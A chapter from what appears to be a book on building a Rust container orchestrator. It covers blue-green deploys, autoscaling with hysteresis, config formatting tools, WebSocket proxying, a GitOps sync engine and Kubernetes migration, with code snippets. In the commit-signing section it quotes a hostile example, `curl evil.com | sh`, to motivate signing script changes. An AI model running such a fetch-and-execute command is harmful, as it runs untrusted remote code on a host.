# The Full Package

Chapter 7 gave us rolling deploys. One instance at a time, health-checked, auto-rollback on failure. Good enough for most production deploys, and considerably better than "stop everything, start everything, hope for the best."

But "good enough for most" leaves gaps. What about the deploy where you *can't* afford even a single bad request during the transition? What about the team that scales from 3 replicas to 30 during peak hours and back to 3 overnight? What about the org that wants git to be the single source of truth, not a human running `relish apply`?

This chapter fills those gaps. Six features, each addressing a real operational need. Together they turn Reliaburger from a container orchestrator into a platform.

## Blue-green deploys

Rolling deploys replace instances one at a time. During the transition, both the old and new versions serve traffic simultaneously. For most apps, that's fine. For apps that have incompatible database schemas between versions, or APIs that break when clients see mixed responses, it's a problem.

Blue-green eliminates the mixed-version window. The approach: start an entirely new fleet ("green"), verify it's healthy, then switch all traffic at once. The old fleet ("blue") keeps running during the switch, so rollback is instant.

### How it differs from rolling

Rolling deploys are sequential. Each step is: start new, health check, swap routing, drain old, stop old. One at a time. Safe, but slow, and both versions serve traffic during the transition.

Blue-green deploys are batched. All new instances start in parallel. All get health-checked. If every green instance passes, routing swaps atomically. If any green instance fails, the entire green fleet gets torn down and blue keeps serving as if nothing happened.

```rust
pub fn execute_blue_green<D: DeployDriver>(
    state: &mut DeployState,
    driver: &D,
) -> Result<DeployResult, DeployError> {
    state.transition(DeployEvent::GreenStarting)?;

    // Start ALL green instances
    for step in &mut state.steps {
        let (id, _) = driver.start_instance(...)?;
        step.new_instance = Some(id);
    }

    // Health check ALL green instances
    state.transition(DeployEvent::GreenAllStarted)?;
    for step in &state.steps {
        driver.await_healthy(step.new_instance.as_deref().unwrap(), timeout)?;
    }

    // Atomic routing swap
    state.transition(DeployEvent::GreenAllHealthy)?;
    for step in &state.steps {
        driver.add_to_routing(app, step.new_instance...)?;
    }
    for step in &state.steps {
        driver.remove_from_routing(app, step.old_instance...);
    }

    // Drain and stop all blue instances
    // ...
}
```

The state machine got three new phases: `StartingGreen`, `HealthCheckingGreen`, `RoutingSwitching`. Each phase has a failure path. If a green instance fails health, the state machine transitions to `Reverting` (with auto-rollback) or `Halted` (without). The abort logic stops all green instances that were started and returns.

The key insight: the abort function doesn't need to "restore" anything. Blue was never touched. The routing table still points to blue. Aborting green is pure cleanup.

### Choosing between strategies

Use rolling when:
- Mixed versions are acceptable during transition
- You want to minimise extra resource usage (only 1 extra instance at a time)
- The deploy is routine (most deploys)

Use blue-green when:
- You need zero mixed-version traffic
- You can afford 2x replicas during the transition window
- Database migrations make rolling back individual instances meaningless

Configure it in the app's `[deploy]` section:

```toml
[app.web.deploy]
strategy = "blue-green"
health_timeout = "60s"
drain_timeout = "30s"
```

## Autoscaling

Three replicas at 2am is wasteful. Three replicas during a product launch is suicidal. You need the system to adjust replica counts based on actual load.

### The control loop

The autoscaler runs on the Raft leader, evaluating every 30 seconds. For each app with an `[autoscale]` section, it:

1. Queries Mayo for the average metric (CPU or memory) over a 5-minute window
2. Computes the desired replica count
3. Applies it if it differs from the current count

The formula: `desired = ceil(current * (metric / target))`. If you have 3 replicas at 90% CPU and your target is 70%, the desired count is `ceil(3 * 0.90 / 0.70) = ceil(3.86) = 4`. One more replica should bring the average down to roughly 67%.

```rust
fn compute_desired(current: u32, metric: f64, config: &AutoscaleConfig) -> u32 {
    let ratio = metric / config.target;
    let raw = (current as f64 * ratio).ceil() as u32;

    // Hysteresis: only scale down when well below target
    let desired = if raw < current {
        if metric < config.target * config.scale_down_threshold {
            raw
        } else {
            current
        }
    } else {
        raw
    };

    desired.clamp(config.min, config.max)
}
```

### Hysteresis and cooldown

Without hysteresis, the autoscaler oscillates. CPU drops to 60% (below the 70% target), it scales down, load per instance jumps back to 90%, it scales up, and you're stuck in a loop.

The fix: a scale-down threshold. The default is 0.8, meaning the metric must drop below `target * 0.8 = 56%` before scaling down. At 60%? No change. At 50%? Scale down. The gap between the scale-up trigger (> 70%) and the scale-down trigger (< 56%) prevents oscillation.

Cooldown adds a time buffer: 3 minutes between consecutive scale events for the same app. Even if the metric spikes again immediately after scaling up, the autoscaler waits. This gives the new replicas time to absorb load before the system decides they're not enough.

### Playing nice with GitOps

Can you see the problem? The git repo says `replicas = 3`. The autoscaler says `replicas = 7`. Who wins?

Both. The trick is to treat them as different concerns. The git value is the *baseline*. The autoscaler's adjustment is a *runtime override*. When Lettuce syncs, it compares the git value against the *previous git value*, not the runtime count. If the git value hasn't changed, the autoscaler's override is left alone. If the git value *has* changed (from 3 to 5, say), the autoscaler's baseline resets to 5.

```rust
pub fn update_baseline(&mut self, app_id: &AppId, new_baseline: u32) {
    if let Some(state) = self.states.get_mut(app_id) {
        state.baseline_replicas = new_baseline;
        state.current_replicas = new_baseline;
        state.last_scale_event = None;
    }
}
```

The `AutoscaleTracker` stores both the baseline (from git/config) and the current count (from the autoscaler). The `get_override` method returns `Some(n)` only if the current count differs from the baseline. Lettuce checks this to avoid resetting runtime adjustments.

### Configuration

```toml
[app.web.autoscale]
metric = "cpu"
target = "70%"
min = 2
max = 20
evaluation_window = "5m"    # optional, default 5m
cooldown = "3m"             # optional, default 3m
scale_down_threshold = 0.8  # optional, default 0.8
```

All three optional fields have sensible defaults. Most users will only set metric, target, min, and max.

### Wiring it to the cluster

The evaluation logic above — `compute_desired`, the hysteresis, the cooldown — was a library nobody spawned. The July 2026 review found `run_autoscale_loop` had no caller: `AutoscaleDecision`s were computed by tests and nothing else. An autoscaler that never runs is a thermostat with no wires.

Wiring it revealed a small design mismatch worth explaining. `run_autoscale_loop` takes a *synchronous* `app_provider` closure — `Fn() -> Vec<(AppId, ...)>` — to list the apps to consider. But the apps live in the Raft desired state, which you read with an `async` call, and the metrics live in the rollup store, also async. A sync closure can't `await`. Rather than contort a shared cache to feed the sync closure, the leader task drives the same *pure* functions directly: `AutoscaleConfig::from_spec`, `evaluate`, and the `AutoscaleTracker`. The tested logic is reused; only the plumbing around it is new. When a library's shape doesn't fit the wiring, reach for its tested internals rather than bending the wiring to the shape.

The loop lives where every leader-only loop in Reliaburger lives — spawned once, checking leadership each tick, no start/stop dance. Each cycle: read the desired apps, keep only those with an `[autoscale]` section, query the rollup store for each app's recent metric, run `evaluate`, and on a decision commit an `AutoscaleOverride` to Raft.

That last word is the whole trick. The autoscaler doesn't deploy anything or talk to nodes. It writes one number to Raft — the desired replica count — and stops. The scheduler from Chapter 2 already watches desired state; it now reads the *effective* replica count (the override if one exists, else the spec's) and re-places accordingly, and the per-node reconcilers converge. Scaling is just another edit to desired state, flowing through the exact machinery a manual `relish apply` uses. No parallel path, no special case. The integration test drives it end to end: deploy a one-replica app, feed a sustained 95% CPU metric into the rollup stores, and watch the cluster grow the app to its `max` of three — purely because a number changed in Raft.

One honesty note on the metric. The autoscaler compares the rollup value against the target as a *utilisation fraction* (0.95 vs 0.70). What Mayo actually records for an app therefore has to be scaled that way; a metric reported in raw millicores would need a target expressed to match. The code documents this at the query seam rather than silently assuming.

### Getting the lifecycle right

The first wired autoscaler had four subtle bugs the review caught, and each one is a small lesson in ordering.

**Start the cooldown after the write, not before.** The loop used to record the scale event — which starts the cooldown clock — and *then* write to Raft. If that write failed, the app never actually scaled, but the cooldown had already started, so the autoscaler sat on its hands for three minutes while nothing had happened. The fix is a one-line reorder: commit first, and only mark the cooldown on a successful write. A failed write now retries on the very next tick, because as far as the tracker is concerned, nothing has changed. Order your side effects so a failure leaves no false memory behind.

**Clear an override the moment its baseline moves.** An override is a runtime adjustment *relative to a baseline*. Redeploy the app with a different replica count, or delete it entirely, and the old override is meaningless — worse than meaningless, because a stale "scale to 7" left sitting in Raft would quietly resize a freshly redeployed app. So the state machine clears the override in the same apply that changes the baseline: on `AppDelete`, and on an `AppSpec` whose replica count differs from the stored one. An image-only redeploy (same replica baseline) leaves the override alone — you don't want a routine version bump throwing away a legitimate scale-up.

**`min > max` is an error, not a clamp.** The old code fed `min` and `max` straight into `.clamp()`, which silently swaps them if they're out of order — so `min = 10, max = 3` quietly became "always 3", hiding an obvious operator typo. Now the `[autoscale]` block is validated at config time: `min > max`, a zero `max`, an unparseable or zero window, an out-of-range threshold — every one fails the deploy loudly with a message naming the field. A validation error the operator reads beats a clamp the operator never sees.

**Use the window the operator configured.** The rollup query was hardcoded to average the last five minutes regardless of what `evaluation_window` said. Now the configured window drives the query, as it always should have. And while we were in the numeric code, we made the resource parsers use checked arithmetic: a memory string like `99999999999999999999Gi` now returns a validation error instead of silently overflowing 64 bits into some small wrong number (a whole class of bug the review labelled DEP9).

## Config tooling

Before GitOps, before Kubernetes migration, before any of the fancy stuff, you need basic config manipulation tools. Three commands, all local (no cluster contact needed).

### `relish compile`

Merges a directory of TOML files into a single resolved config. Walks subdirectories recursively. If a subdirectory contains a `_defaults.toml`, those fields are merged into every app in the directory that doesn't set them explicitly.

```
configs/
  _defaults.toml          # image = "myorg/base:v1"
  web.toml                # [app.web] replicas = 3
  backend/
    api.toml              # [app.api] image = "api:v2"
```

Running `relish compile configs/` produces a single TOML with both apps. The web app inherits `image = "myorg/base:v1"` from defaults. The api app keeps its explicit image. The directory name `backend` becomes the namespace for the api app.

Invalid files produce warnings, not errors. One broken TOML file shouldn't block the other nine from compiling. The warnings include the filename and parse error.

### `relish fmt`

Reformats a TOML config with canonical section ordering. The order is: namespace, permission, app, job, build. Within each section, keys are alphabetical (courtesy of `BTreeMap`'s ordering when we round-trip through `toml`).

`relish fmt app.toml` rewrites the file in place. `relish fmt app.toml --check` exits non-zero if the file needs formatting, without modifying it. Use `--check` in CI to enforce consistent formatting.

The formatter is idempotent. Running it twice produces the same output as running it once.

#### The bug that ate configs

The first version of the formatter had a bug that's worth dissecting, because the fix teaches a defensive pattern you'll reuse.

The emission code walked one level of nesting: `[app.web]` worked, but a nested table like `[app.web.health]` hit a fallback that serialised the whole health table with `toml::to_string`. That function serialises a *document* — `path = "/health"` on its own line — not a *value*. The output ended up as `health = path = "/health"`, which isn't TOML at all. And because `relish fmt` writes in place, it wrote that garbage straight over your config. Format once, lose your file.

Two fixes. The first is the obvious one: emit sections recursively, so `[app.web.health]` gets its own dotted header no matter how deep it nests. Scalar fields print inline via `toml::Value`'s `Display` implementation, which produces value syntax (strings quoted, arrays bracketed), never document syntax.

The second fix is the interesting one. The formatter now refuses to return output it can't verify:

```rust
fn verify_roundtrip(
    original: &BTreeMap<String, toml::Value>,
    output: &str,
) -> Result<(), RelishError> {
    let reparsed: BTreeMap<String, toml::Value> = toml::from_str(output)
        .map_err(|e| RelishError::FormatFailed(format!(
            "formatter produced invalid TOML ({e}); file left untouched"
        )))?;
    if &reparsed != original {
        return Err(RelishError::FormatFailed(
            "formatted output would change the config's meaning; file left untouched".to_string(),
        ));
    }
    Ok(())
}
```

Parse what you're about to write, and compare it with what you started from. `toml::Value` derives `PartialEq`, so `!=` here is a deep structural comparison of the whole value tree — every table, every array, every string, in one operator. In C you'd write a recursive comparison by hand; in Rust the derive gives it to you for free, and the compiler guarantees it stays in sync with the type.

Can you see what this buys us? The formatter can still have bugs. But now a bug produces an error message instead of a corrupted file. When a tool rewrites user data in place, "fail loudly" beats "trust the code" every time.

And then, having built a guard against writing the *wrong* content, we went ahead and wrote the right content the wrong way:

```rust
fs::write(path, &formatted)?;
```

`fs::write` opens with `O_TRUNC`. The file is emptied first and refilled second, so between those two moments the config is zero bytes. Crash there, run out of disk there, get killed by the OOM killer there, and what's left isn't the old config and isn't the new one — and this is a file the node reads at startup. The round-trip guard is careful about *what* we write and said nothing about *when* the file stops being valid.

The fix is the oldest trick in Unix:

```rust
let temp = directory.join(format!(".{file_name}.{}.tmp", std::process::id()));
fs::write(&temp, bytes)?;
fs::rename(&temp, path)?;
```

Write the whole thing somewhere else, then `rename` it over the target. `rename(2)` is atomic: any reader sees the old file or the new file, never a half-file. The temp goes in the *same directory* on purpose — rename is only atomic within a filesystem, and pointing at `/tmp` would silently degrade it to copy-then-delete, which is exactly the torn write we're trying to avoid. It also carries the pid, so two `relish fmt` runs in one directory don't fight over the same scratch file.

Worth noticing how the two protections differ. The round-trip guard is about *correctness*: is this output the same config? The atomic rename is about *atomicity*: is there any instant where an observer sees neither? A tool that rewrites files in place needs both, and having one makes it very easy to assume you have the other.

The third thing `fmt` did quietly was eat comments. That part is by design — the formatter round-trips through `toml`'s typed representation, which has nowhere to keep them — but "by design" is not the same as "the operator knows". It now says so, once, when the input had comments to lose. Design decisions that destroy user data should be announced by the program, not by the documentation.

`compile` had the same shape of problem one level up. It merged files with `extend` on name-keyed maps, so a second `[app.web]` in a second file silently replaced the first, and the output looked complete. It now warns on every overwrite — while leaving two apps of the same name in *different* namespaces alone, since that's been legal since instance identity gained namespaces. And a malformed `_defaults.toml` used to be swallowed by `.ok()?`, making a typo indistinguishable from "there are no defaults": the default image vanished from every app in the directory and the error resurfaced much later as a missing field. `Option` is a lovely type for "there isn't one" and a terrible one for "there is one but I couldn't read it".

### `relish diff`

Shows a structural, field-by-field diff between two configs. Not a text diff -- a semantic one. It knows that changing `image` from `v1` to `v2` is a modification, adding a new `[app.api]` section is an addition, and removing `[job.migrate]` is a deletion.

```
$ relish diff old.toml new.toml
~ app.web
    image: myapp:v1 -> myapp:v2
+ app.api
- job.cleanup
```

The output serialises to JSON for programmatic consumption. Lettuce's diff engine reuses the same structural comparison logic.

### Exit codes are an API

A CLI has two output channels: what it prints, and what it returns. Scripts read the second one. For a long time `relish apply` got this wrong: when the agent was unreachable, it printed a dry-run plan, added a polite note, and exited 0. Run that from CI with the agent down and your pipeline goes green while deploying nothing.

The fix splits the two intents apart. `relish apply --dry-run` previews the plan and exits 0 — that's the explicit "don't deploy" path. Plain `relish apply` with no reachable agent still prints the plan for reference, but exits non-zero with an error saying nothing was deployed. If a script wanted the old behaviour, it now has to ask for it by name.

The same pass fixed a quieter lie in `relish logs`. The `--grep`, `--since`, and `--json-field` flags parsed fine and were then bound to variables named `_grep`, `_since`, `_json_field` — the underscore prefix being Rust's way of saying "I know this is unused, don't warn me". The flags did nothing, silently. Now `--grep` and `--since` travel to the server as query parameters (the endpoints already supported them), and `--json-field key=value` filters client-side, keeping only lines that parse as JSON with a matching field. In follow mode the SSE stream can't filter server-side, so the same filters apply client-side as each line arrives.

The lesson generalises. An unused-variable warning is the compiler telling you your feature doesn't work; naming the variable `_grep` to quiet it is shooting the messenger. If a flag exists, it either works or the command should reject it.

## WebSocket proxying

The Wrapper ingress proxy from Chapter 3 handles HTTP. But what happens when a client sends a WebSocket upgrade request?

The normal proxy path buffers the entire request body via `axum::body::to_bytes`. That's fine for regular HTTP. For WebSocket, it's fatal. WebSocket upgrade is an HTTP/1.1 mechanism: the client sends an upgrade request, the backend responds with `101 Switching Protocols`, and then both sides switch to raw TCP framing. You can't buffer that.

### Detection before buffering

The fix: check for WebSocket upgrade *before* touching the body.

```rust
async fn do_proxy(state: &ProxyState, req: Request<Body>) -> Response {
    let is_ws = is_websocket_upgrade(&req);

    // ... route lookup ...

    if is_ws && !route.websocket {
        return StatusCode::BAD_REQUEST.into_response();
    }

    if is_ws {
        return handle_websocket_upgrade(req, backend).await;
    }

    // Normal HTTP path (body buffering happens here)
    let body_bytes = axum::body::to_bytes(body, 10 * 1024 * 1024).await?;
    // ...
}
```

Two branches, decided before any I/O happens. WebSocket requests skip the body buffer entirely. Routes that don't have `websocket = true` reject upgrade attempts with 400. This prevents accidental WebSocket connections to backends that don't expect them.

### The upgrade detection

A valid WebSocket upgrade has two headers: `Connection: Upgrade` (or a Connection header containing "upgrade" as a token) and `Upgrade: websocket`. Both checks are case-insensitive. The Connection header can contain multiple values (`keep-alive, Upgrade`), so we check for the substring rather than exact match.

```rust
pub fn is_websocket_upgrade(req: &Request<Body>) -> bool {
    let has_upgrade_connection = req.headers()
        .get(header::CONNECTION)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.to_lowercase().contains("upgrade"));

    let has_websocket_upgrade = req.headers()
        .get(header::UPGRADE)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.eq_ignore_ascii_case("websocket"));

    has_upgrade_connection && has_websocket_upgrade
}
```

### Connection draining

WebSocket connections are long-lived. When a backend is being drained (during a rolling or blue-green deploy), HTTP connections finish naturally within the drain timeout. WebSocket connections don't finish on their own -- they stay open indefinitely.

The solution: send a WebSocket Close frame (opcode 0x08, status code 1001 "Going Away") to the client, wait 5 seconds for the close handshake, then RST the TCP connection. The Close frame is just 4 bytes:

```rust
pub fn build_close_frame(status: u16) -> Vec<u8> {
    vec![
        0x88,                        // FIN + opcode Close
        0x02,                        // payload length = 2
        (status >> 8) as u8,         // status high byte
        (status & 0xFF) as u8,       // status low byte
    ]
}
```

No need for a full WebSocket library. Four bytes, hand-built. Well-behaved WebSocket clients see the 1001, close their end of the connection, and reconnect to a healthy backend. Misbehaving clients get RST'd after the timeout.

## Lettuce: the GitOps engine

Every other subsystem in Reliaburger reacts to `relish apply`. Lettuce makes `relish apply` happen automatically when you push to git.

The idea: a module inside Bun watches a git repository. When a commit changes a TOML file, Lettuce parses it, diffs it against the current cluster state, and applies only the changes. No ArgoCD, no Flux, no CRDs, no extra binaries. Git is the source of truth.

### Architecture

Lettuce runs on a single council member elected as the **GitOps coordinator**. Not the Raft leader -- a separate election that distributes load. If the coordinator dies, another council member takes over within seconds, inheriting the last sync state from Raft.

The sync loop:

1. **Trigger.** Poll timer (default 30s) or webhook
2. **Git fetch.** If HEAD hasn't changed since last sync, short-circuit
3. **Signature verification.** If required (global or auto-enforced for script changes)
4. **TOML parse.** All `.toml` files under the configured path. Parse errors are per-file, not global
5. **Diff.** Field-by-field comparison against current Raft state. Autoscaler-aware
6. **Selective apply.** Only changed resources written to Raft

### Coordinator election

```rust
pub fn select_coordinator(
    council_members: &[String],
    leader_id: &str,
    reason: CoordinatorElectionReason,
) -> Option<CoordinatorElection> {
    let non_leaders: Vec<_> = council_members.iter()
        .filter(|id| id.as_str() != leader_id)
        .collect();

    let selected = if non_leaders.is_empty() {
        leader_id.to_string()  // single-node: leader is coordinator
    } else {
        let mut sorted = non_leaders;
        sorted.sort();
        sorted[0].clone()  // deterministic: first non-leader
    };

    Some(CoordinatorElection { node_id: selected, reason, ... })
}
```

Why prefer non-leaders? The Raft leader already handles write requests, log replication, and heartbeats. Adding the sync loop on top means the leader does more I/O during every sync cycle (git fetch, file read, Raft write). Putting it on another council member spreads the work across two nodes instead of concentrating it on one.

Why deterministic? If two nodes simultaneously decide the coordinator needs replacing, they must agree on who the replacement is. Sorting alphabetically and picking the first non-leader means every node arrives at the same answer independently.

### Webhook validation

When a git provider sends a push webhook, Lettuce validates it with three checks:

1. **HMAC-SHA256 signature.** GitHub sends `X-Hub-Signature-256: sha256=<hex>`. We compute the HMAC with the configured secret and compare. A mismatch means the payload was tampered with or the secret is wrong.

2. **Replay detection.** GitHub includes a unique delivery ID in `X-GitHub-Delivery`. Lettuce keeps the last 1000 delivery IDs in a bounded deque. If the same ID shows up twice, it's a replay (network retry, misconfigured webhook, or attack).

3. **Rate limiting.** Token bucket, configurable per minute (default 10). A burst of webhook deliveries from a force-push-heavy workflow doesn't overwhelm the sync loop. Excess webhooks are rejected with an error; the poll timer catches up on the next cycle.

### Script-aware signing

Here's a subtle security requirement. An unsigned commit that changes `image = "redis:7"` to `image = "redis:8"` is probably fine. An unsigned commit that adds `script = "curl evil.com | sh"` is definitely not.

Lettuce auto-enforces commit signing for any commit that adds or modifies a `script` field, regardless of the global `require_signed_commits` setting. The check happens by diffing the commit against its parent and searching for added lines containing "script".

### Back-off on failure

If a sync fails (network error, git auth failure, parse error), Lettuce doesn't retry at the normal interval. It backs off exponentially: 30s, 60s, 120s, 240s, capped at 8x the base interval. Consecutive failure count resets to zero on the first successful sync.

```rust
pub fn backoff_delay(base: Duration, failures: u32) -> Duration {
    let multiplier = 2u32.saturating_pow(failures).min(8);
    base * multiplier
}
```

### Switching it on

All of the above — `execute_sync`, the diff engine, signature verification, the webhook validator — was a library nobody ran. The July 2026 review found `execute_sync` had no caller, `/v1/gitops/webhook` returned 503 unconditionally (`gitops_webhook_tx` was hardcoded `None`), and the `[gitops]` config section was parsed and never read. A GitOps engine that never touches git.

The runner (`spawn_gitops_sync`) is the missing piece: a leader-only task that clones the configured repo, then on each poll tick or webhook nudge reads the current apps and last-applied sha from Raft, runs `execute_sync` in `spawn_blocking` (git shells out; never on the async runtime), and applies the resulting changes — `Add`/`Update` become `AppSpec` writes to Raft, `Remove` becomes `AppDelete`. Exactly the desired-state writes a manual `relish apply` makes, which means the scheduler and reconcilers from Chapter 2 pick them up for free. Git becomes just another writer of desired state. The webhook endpoint now has a channel to nudge, so a `git push` hook triggers a sync in milliseconds instead of waiting for the poll.

Wiring it flushed out a bug that only a real repo could surface. `execute_sync` starts by fetching, and treats "fetch found no new commit" as "nothing to do". But the *first* sync after cloning has nothing new to fetch — the clone already contains the commit — yet the desired state has never been applied. The result: a freshly-configured GitOps repo synced *nothing* until someone pushed a second commit. The fix distinguishes "no new commit since last fetch" from "current HEAD not yet applied": when the repo's HEAD differs from the last-*applied* sha, sync it regardless of whether the fetch pulled anything. The unit tests never caught this because they drove `execute_sync` with a mock repo whose `fetch` returned a commit on demand; only a real bare clone, where the first fetch is genuinely a no-op, exposed it.

### The trusted key that trusted everyone (H12)

One security fix rides along. Lettuce can require commits to be GPG-signed by a trusted key, and `is_key_trusted` checked the signing fingerprint against the configured allowlist. Or it looked like it did. After the loop that searched for a matching key, the function ended with `return true` — a comment explained it as "trust any valid signature when trusted_keys is provided." So a validly-signed commit from *any* key sailed through: a departed employee's key, a compromised laptop, an attacker who forked your repo and signed with their own key. The allowlist was decoration; the only check that ran was "is the signature cryptographically valid," which proves the committer holds *some* private key, not *your* private key.

The fix is one line — return whether any trusted fingerprint appears in the verify output, with no fall-through. A valid signature from an unlisted key is now `UntrustedKey`, and the commit is rejected. The two regression tests are the ones that should have existed from the start: a matching fingerprint is trusted, an unlisted one is not. It's a reminder that a security check which always returns "yes" is worse than no check, because it shows up green in the audit.

## Kubernetes migration

Most teams don't start from scratch. They have existing Kubernetes manifests -- dozens of them, spread across namespaces, wired together with Services, Ingresses, HPAs, ConfigMaps. Asking those teams to rewrite everything in TOML by hand is a non-starter.

`relish import` and `relish export` solve this. Import reads K8s YAML and produces Reliaburger TOML. Export goes the other way. Together they make migration a mechanical process, not a rewrite.

### The correlation problem

In Kubernetes, a single application is split across multiple resource types. A web app might be: a Deployment (the containers), a Service (the network endpoint), an Ingress (the external routing), an HPA (the autoscaler), a ConfigMap (the configuration), and a Secret (the credentials). Six YAML files, each referencing the others by name.

In Reliaburger, that same application is one `[app.web]` section with sub-sections for ingress, autoscale, env, and health. The importer needs to figure out which K8s resources belong together and merge them.

The correlation rules use the same matching logic Kubernetes itself uses:

1. Service → Deployment by label selector
2. Ingress → Service by backend service name
3. HPA → workload by `scaleTargetRef.name`

```rust
fn find_ingress_for_service(
    ingresses: &BTreeMap<String, Ingress>,
    service_name: &str,
) -> Option<String> {
    for (ing_name, ing) in ingresses {
        if let Some(spec) = &ing.spec {
            if let Some(rules) = &spec.rules {
                for rule in rules {
                    if let Some(http) = &rule.http {
                        for path in &http.paths {
                            if let Some(backend) = &path.backend.service {
                                if backend.name == service_name {
                                    return Some(ing_name.clone());
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    None
}
```

Five levels of `if let Some`. That's what happens when you navigate the K8s API's deeply nested Option types. Each level is a field that might not be set. The k8s-openapi crate mirrors the Go API faithfully, including the optionality of everything.

### Using k8s-openapi

We debated hand-rolling lightweight K8s structs vs pulling in the official types. The official types won for one reason: correctness. The K8s API has hundreds of fields with subtle serialisation rules (camelCase JSON keys, integer-or-string unions, multiple API versions). Getting all of that right by hand is a maintenance burden. Getting it right once via `k8s-openapi` is free.

The dependency is optional. A `kubernetes` Cargo feature (default-on) gates the import/export modules. Users who don't need K8s migration compile with `--no-default-features` and skip the dependency entirely.

```toml
[features]
default = ["kubernetes"]
kubernetes = ["dep:k8s-openapi"]

[dependencies]
k8s-openapi = { version = "0.22", default-features = false, features = ["latest"], optional = true }
```

We disable `default-features` on k8s-openapi because we only need the type definitions, not the API client operations. That shaves off a chunk of compile time.

### The field mapping

A Kubernetes Deployment becomes an `AppSpec`. The mapping isn't one-to-one, but it's close enough that the output is usable without manual editing for most cases:

- `spec.replicas` → `replicas`
- `spec.template.spec.containers[0].image` → `image`
- `containers[0].command` + `containers[0].args` → `command` (concatenated — K8s splits the argv into two fields, we keep one)
- `metadata.namespace` → `namespace`
- `containers[0].ports[0].containerPort` → `port`
- `env[].value` → `env` (plain values)
- `readinessProbe.httpGet.path` → `health.path`
- `strategy.rollingUpdate.maxSurge` → `deploy.max_surge`
- `terminationGracePeriodSeconds` → `deploy.drain_timeout`
- `nodeSelector` → `placement.required`
- `initContainers` → `init`

DaemonSets become `replicas = "*"`. StatefulSets produce a warning because Reliaburger doesn't have ordered startup or stable network IDs. Jobs and CronJobs map directly.

Three of those rows have a history: `command`, `namespace`, and env values used to be silently dropped. A Deployment running `python -m worker.main` would import as an app running the image's default entrypoint. No error, no warning — the config just did something different from the original. Silent data loss during migration is the worst kind, because you only discover it when the workload misbehaves in production.

Env vars that use `valueFrom` (secret refs, configmap refs, field refs) still can't map automatically — there's no way to reach into another cluster's secret store. But now they land in the migration report as warnings naming each variable, instead of vanishing. The rule the importer follows: convert what you can, warn about what you can't, drop nothing silently.

One more K8s-ism: names are scoped per namespace, so `api` in `alpha` and `api` in `beta` are different workloads. A flat TOML table has one key per name. When the importer sees a collision it keeps the first app under its own name and imports the second as `[app.beta-api]`, with a warning — rather than letting the second overwrite the first.

### The migration report

Every import produces a report on stderr: what was converted, what was approximated, and what was dropped.

```
Converted:
  + Deployment/web → [app.web]

Approximated (review recommended):
  ~ StatefulSet/redis — ordering guarantees and stable network IDs lost

Dropped (no Reliaburger equivalent):
  - MyCustomResource/foo — no Reliaburger equivalent
  - ServiceAccount/worker-sa — no Reliaburger equivalent
```

CRDs, ServiceAccounts, PodDisruptionBudgets, RBAC — these either have no equivalent or are handled automatically by Reliaburger (SPIFFE replaces ServiceAccounts, deploy config replaces PDBs). The report tells you exactly what to review.

### Export: the reverse direction

`relish export` reads a TOML config and produces multi-document K8s YAML. Each app becomes a Deployment + Service (or DaemonSet). Ingress, HPA, ConfigMap, and Secret resources are added when the relevant config sections exist.

Features with no K8s equivalent show up in the export report: `auto_rollback`, Smoker fault rules, process workloads, build jobs, `run_before` dependency ordering. The report suggests K8s alternatives where they exist (Argo Workflows for dependency ordering, NetworkPolicy for firewall rules).

## Lessons learned

**The mock driver refactor was worth it.** When we added blue-green deploys, the existing `MockDriver` broke. It tracked steps by counting `stop_instance` calls, which worked for rolling (one stop per step). In blue-green, all starts happen before any stops. The fix: separate counters for start and health check calls. A small change, but it highlighted why the mock should model *operation counts*, not *lifecycle phases*.

**Hysteresis is not optional.** The first autoscaler version scaled down as soon as the metric dropped below target. It oscillated wildly. CPU drops, scale down, CPU spikes, scale up, CPU drops, scale down. The hysteresis threshold (scale down only below target * 0.8) eliminated the oscillation. The cooldown (3 minutes between scale events) added stability. Both are required. Neither is clever -- they're standard control theory, applied.

**`toml_edit` was overkill for formatting.** We initially used `toml_edit` to preserve comments during formatting. It works, but the comment-preserving reserialisation introduced subtle ordering bugs that were painful to debug. We switched to a simpler approach: parse with `toml`, reserialise with canonical section ordering, accept that comments are lost. For machine-generated configs (which is what `relish compile` produces, and what Lettuce processes), comment loss is irrelevant. For hand-edited configs, `relish lint` validates without reformatting.

**WebSocket is 95% detection, 5% proxying.** We spent most of the time on header detection edge cases (case-insensitive matching, multi-value Connection headers, routes that don't opt in). The actual proxying -- connect to backend, forward upgrade, bidirectional copy -- is straightforward. The Close frame for draining is 4 bytes of hand-built binary. No WebSocket library needed.

**Coordinator election should be boring.** Our first design for Lettuce's coordinator election had scoring heuristics: CPU load, memory availability, network latency to the git remote. We replaced it with "first non-leader alphabetically." It's deterministic, requires no measurement, and produces the same result on every node without communication. The scoring approach might produce slightly better placement, but the added complexity wasn't worth it for a role that does one git fetch every 30 seconds.

**`skip_serializing_if` is not optional for config output.** The first version of `relish compile` and `relish import` produced TOML with dozens of empty sections: `[app.web.env]` with nothing in it, `command = []`, `config_file = []`, `[job]`, `[namespace]`, `[permission]`, `[build]`. Every `#[serde(default)]` field got serialised to its default value. The fix was adding `#[serde(skip_serializing_if = "Vec::is_empty")]` and friends to every collection and Option field on `AppSpec`, `JobSpec`, and `Config`. One attribute per field, mechanical work, but the output went from 30 lines of noise per app to just the fields that matter.

**Defaults must cascade.** The first `relish compile` applied `_defaults.toml` only to files in the same directory. A config structure with `configs/_defaults.toml` and `configs/backend/api.toml` wouldn't inherit the defaults into the subdirectory. The fix was passing the parent's defaults into the recursive call, with the child's own `_defaults.toml` taking priority if present. The bug was invisible in unit tests (which tested flat directories) and only showed up in the demo script, which was the first time anyone tried a nested directory structure. Write your demo scripts early.

**Five levels of `if let Some` is the price of K8s correctness.** The k8s-openapi crate is faithful to the Go API, where every field is a pointer and might be nil. In Rust, that becomes deeply nested `Option` chains. You can flatten them with helper functions, but the navigation code still reads like an archaeological dig through layers of optionality. The alternative -- hand-rolled structs with `#[serde(default)]` on everything -- trades correctness for readability. We picked correctness and accepted the nesting.

## Tests

Six features, and nearly all of them turn out to be pure functions hiding inside an operational story. `compute_desired` is arithmetic. `is_websocket_upgrade` reads headers. `select_coordinator` sorts a list. The blue-green orchestrator runs against the same `MockDriver` from Chapter 7. So Phase 9 is, once again, mostly unit tests — 117 of them.

### Unit tests by feature

- **Blue-green** — the orchestrator against `MockDriver` (6), plus the new state-machine transitions (`StartingGreen`, `HealthCheckingGreen`, `RoutingSwitching` and their failure paths, 7). The mock had to be refactored to count operations rather than lifecycle phases — see the lessons below.
